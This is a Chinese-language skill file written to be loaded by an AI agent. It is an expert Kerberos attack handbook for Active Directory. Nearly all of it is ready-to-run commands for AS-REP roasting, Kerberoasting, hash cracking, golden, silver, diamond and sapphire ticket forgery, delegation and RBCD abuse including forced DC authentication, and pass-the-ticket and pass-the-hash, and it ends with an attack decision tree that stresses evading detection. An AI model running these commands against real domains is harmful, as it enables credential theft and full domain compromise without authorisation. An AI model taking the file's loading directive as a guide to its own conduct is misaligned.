# 技能：Kerberos 攻击手册 — 专家级 AD 攻击指南

> **AI 加载指令**：适用于 AD 环境的专家级 Kerberos 攻击技术。涵盖 AS-REP 炸炉、Kerberoasting、黄金/白银/钻石/蓝宝石票据、委派攻击、票证传递和哈希传递。基础模型会忽略票据类型的差异、委派链的细微差别以及检测-规避的权衡。

## 0. 相关路由

深入学习之前，请考虑加载：

- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) 用于基于 ACL 的 AD 攻击，通常与 Kerberos 链接使用
- [active-directory-certificate-services](../active-directory-certificate-services/SKILL.md) 用于基于 ADCS 的持久化（黄金证书）
- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) 用于与 Kerberos 滥用互补的 NTLM 中继攻击
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) 获取票证后用于横向移动

### 高级参考

当您需要以下内容时，请加载 [KERBEROS_ATTACK_CHAINS.md](./KERBEROS_ATTACK_CHAINS.md)：
- 结合 Kerberos 与 ACL 滥用、ADCS 和中继的多步骤攻击链
- 从 foothold 到域管理员的全流程场景
- 链式委派攻击流程

---

## 1. Kerberos 身份验证基础

```
客户端              KDC (域控制器)              服务
  │                   │                     │
  │── AS-REQ ────────→│                     │  (1) 使用用户凭证请求 TGT
  │←─ AS-REP ─────────│                     │  (2) 接收 TGT（使用 krbtgt 哈希加密）
  │                   │                     │
  │── TGS-REQ ───────→│                     │  (3) 提交 TGT，请求服务票证
  │←─ TGS-REP ────────│                     │  (4) 接收 TGS（使用服务哈希加密）
  │                   │                     │
  │── AP-REQ ─────────────────────────────→│  (5) 向服务提交 TGS
  │←─ AP-REP ──────────────────────────────│  (6) 互操作证（可选）
```

---

## 2. AS-REP 炸炉

具有“不需要 Kerberos 预身份验证”权限的用户可以在不知道其密码的情况下被查询 AS-REP。

### 列出易受攻击的用户

```bash
# Impacket — 从 Linux
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.txt

# Impacket — 使用域凭证（自动枚举）
GetNPUsers.py DOMAIN/user:password -dc-ip DC_IP -request

# Rubeus — 从 Windows（已加入域）
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# PowerView — 列出用户
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname
```

### 炸 AS-REP 哈希

```bash
# Hashcat 模式 18200
hashcat -m 18200 asrep.txt rockyou.txt --rules-file best64.rule

# John
john asrep.txt --wordlist=rockyou.txt
```

---

## 3. Kerberoasting

任何域用户都可以请求具有 SPN 的账户的 TGS。TGS 使用服务账户的 NTLM 哈希加密。

### 请求服务票证

```bash
# Impacket
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request -outputfile tgs.txt

# Rubeus (从 Windows)
Rubeus.exe kerberoast /outfile:tgs.txt

# Rubeus — 针对特定 SPN / 高价值账户
Rubeus.exe kerberoast /user:svc_sql /outfile:tgs_sql.txt

# PowerView + 手动请求
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/db.domain.com"
```

### 炸 TGS 哈希

```bash
# Hashcat 模式 13100 (RC4) 或 19700 (AES)
hashcat -m 13100 tgs.txt rockyou.txt --rules-file best64.rule

# RC4 票证比 AES256 炸得更快 — 如果可能，请针对 RC4
# Rubeus: /tgtdeleg 在某些配置上强制使用 RC4
Rubeus.exe kerberoast /tgtdeleg
```

---

## 4. 票证伪造 — 黄金、白银、钻石、蓝宝石

### 黄金票证

使用 `krbtgt` 哈希伪造 TGT → 伪造任何用户，包括不存在的用户。

```bash
# Impacket — 伪造黄金票证
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain DOMAIN.COM administrator

# Mimikatz
kerberos::golden /user:administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt

# Rubeus
Rubeus.exe golden /rc4:KRBTGT_HASH /user:administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /ptt
```

**前提条件**：krbtgt NTLM 哈希（来自 DCSync 或 NTDS.dit）
**持久化**：有效直到 krbtgt 密码更改 **两次**

### 白银票证

使用服务账户的哈希伪造 TGS → 仅访问特定服务，无需与 KDC 交互。

```bash
# Impacket — 伪造 CIFS（文件共享）白银票证
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain DOMAIN.COM -spn cifs/target.domain.com administrator

# Mimikatz
kerberos::golden /user:administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /target:target.domain.com /service:cifs /rc4:SERVICE_HASH /ptt
```

| 目标服务 | SPN 格式 | 用例 |
|---|---|---|
| 文件共享 | `cifs/host` | 访问 SMB 共享 |
| WinRM | `http/host` | 远程 PowerShell |
| LDAP | `ldap/dc` | DCSync 类似查询 |
| MSSQL | `MSSQLSvc/host:1433` | 数据库访问 |
| Exchange | `http/mail.domain.com` | 邮箱访问 |

### 钻石票证

修改一个真实颁发的 TGT → 比黄金票证更难检测。

```bash
# Rubeus — 请求真实 TGT 然后修改 PAC
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /user:administrator /domain:DOMAIN.COM /dc:DC01.DOMAIN.COM /ticketuser:targetadmin /ticketuserid:500 /groups:512 /ptt
```

**优势**：票证的元数据（时间戳、加密类型）与真实 TGT 发起匹配。

### 蓝宝石票证

使用 S4U2Self 获取目标用户的真实 PAC，然后将其嵌入伪造的票证。

```bash
# Rubeus
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /ticketuser:administrator /ticketuserid:500 /groups:512 /tgtdeleg /ptt
```

**优势**：PAC 是从 KDC 获取的真实副本，使检测极其困难。

---

## 5. 委派攻击

### 无约束委派

具有无约束委派的主机将用户 TGT 存储在内存中。

```bash
# 枚举 (PowerView)
Get-DomainComputer -Unconstrained | Select-Object dnshostname

# 强制管理员身份验证 → 捕获 TGT (Rubeus 监控模式)
Rubeus.exe monitor /interval:5 /nowrap

# 通过 PrinterBug / PetitPotam 触发 → DC 身份验证 → 捕获 TGT
SpoolSample.exe DC01.domain.com COMPROMISED_HOST.domain.com
```

### 约束委派 (S4U2Proxy)

```bash
# 枚举
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname,msds-allowedtodelegateto

# S4U2Self + S4U2Proxy → 任何用户获取允许服务作为 TGS
getST.py -spn cifs/target.domain.com -impersonate administrator DOMAIN/svc_account:password -dc-ip DC_IP

# Rubeus
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.com /ptt
```

### 基于资源的约束委派 (RBCD)

需要在目标上的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 上具有写入权限。

```bash
# 1. 创建或控制一台计算机账户 (MAQ > 0)
addcomputer.py -computer-name 'FAKE$' -computer-pass 'P@ss123' -dc-ip DC_IP DOMAIN/user:password

# 2. 在目标上设置 RBCD
rbcd.py -delegate-from 'FAKE$' -delegate-to 'TARGET$' -dc-ip DC_IP -action write DOMAIN/user:password

# 3. 从受控账户进行 S4U2Self + S4U2Proxy
getST.py -spn cifs/TARGET.DOMAIN.COM -impersonate administrator DOMAIN/'FAKE$':'P@ss123' -dc-ip DC_IP

# 4. 使用票证
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass DOMAIN/administrator@TARGET.DOMAIN.COM
```

---

## 6. 票证传递 & 哈希传递

### 票证传递

```bash
# Impacket — 使用 .ccache 票证
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass DOMAIN/administrator@target.domain.com

# Mimikatz — 将 .kirbi 票证注入会话
kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe ptt /ticket:base64_ticket_blob
```

### 哈希传递 (Pass-the-Key)

使用 NTLM 哈希请求 Kerberos TGT → 纯 Kerberos 身份验证（避免 NTLM 日志记录）。

```bash
# Impacket
getTGT.py DOMAIN/user -hashes :NTLM_HASH -dc-ip DC_IP
export KRB5CCNAME=user.ccache

# Rubeus (从 Windows)
Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt

# Mimikatz
sekurlsa::pth /user:administrator /domain:DOMAIN.COM /ntlm:NTLM_HASH /run:cmd.exe
```

---

## 7. Kerberos 双跳问题

当通过 Kerberos 在两个跳（A → B → C）之间进行身份验证时，B 默认无法将 A 的凭证转发给 C。

### 解决方案

| 方法 | 方式 | 风险 |
|---|---|---|
| CredSSP | 发送实际凭证给 B | 凭证暴露 |
| B 上无约束委派 | B 存储A的 TGT | 过度特权 |
| 约束委派 | B 允许委派给 C | 推荐 — 范围内 |
| RBCD | C 信任 B 委派 | 现代、灵活 |
| 嵌套的 Invoke-Command | 嵌套会话中的 `-Credential` 参数 | 在脚本中暴露密码 |

---

## 8. Kerberos 攻击决策树

```
AD 环境 — 针对 Kerberos 的攻击
│
├── 是否有域用户凭证？
│   ├── Kerberoast → 炸服务账户哈希 (§3)
│   ├── 枚举无预身份验证的用户 → AS-REP 炸 (§2)
│   ├── 枚举委派 → 无约束/约束/RBCD (§5)
│   └── 枚举高价值账户的 SPN
│
├── 是否有服务账户哈希？
│   ├── 针对该服务的白银票证 (§4)
│   └── 如果约束委派 → S4U2Proxy 链 (§5)
│
├── 是否有 krbtgt 哈希？
│   ├── 黄金票证 → 任何用户，任何服务 (§4)
│   ├── 钻石票证 → 更隐蔽的伪造 (§4)
│   └── 蓝宝石票证 → 最难检测 (§4)
│
├── 被攻陷的主机具有无约束委派？
│   ├── 监控传入的 TGT (Rubeus 监控)
│   ├── 强制 DC 身份验证 (PrinterBug/PetitPotam)
│   └── 捕获 DC TGT → DCSync
│
├── 是否可以写入目标的 `msDS-AllowedToActOnBehalfOfOtherIdentity`？
│   └── RBCD 攻击 (§5) → 创建机器账户 + 委派
│
├── 是否有 NTLM 哈希但需要 Kerberos 身份验证？
│   └── 哈希传递 → 请求 TGT (§6)
│
└── 是否有 .kirbi / .ccache 票证？
    └── 票证传递 → 直接使用 (§6)
```
